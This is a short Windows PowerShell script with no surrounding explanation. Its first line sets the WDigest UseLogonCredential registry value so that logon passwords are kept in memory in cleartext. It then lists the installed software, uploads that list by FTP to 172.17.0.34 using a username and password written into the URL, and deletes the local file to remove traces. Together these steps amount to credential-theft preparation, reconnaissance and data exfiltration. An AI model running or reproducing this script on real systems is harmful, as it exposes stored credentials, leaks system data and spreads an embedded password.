reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
$listApps=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
$listApps | Out-File -filepath C:\myapps.txt
$file = "C:\myapps.txt"
$ftpuri = "ftp://simon:QuenteL789!@172.17.0.34/myapps2.txt"
$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri)
$webclient.UploadFile($uri, $file)  
Remove-Item -Path C:\myapps.txt -Force
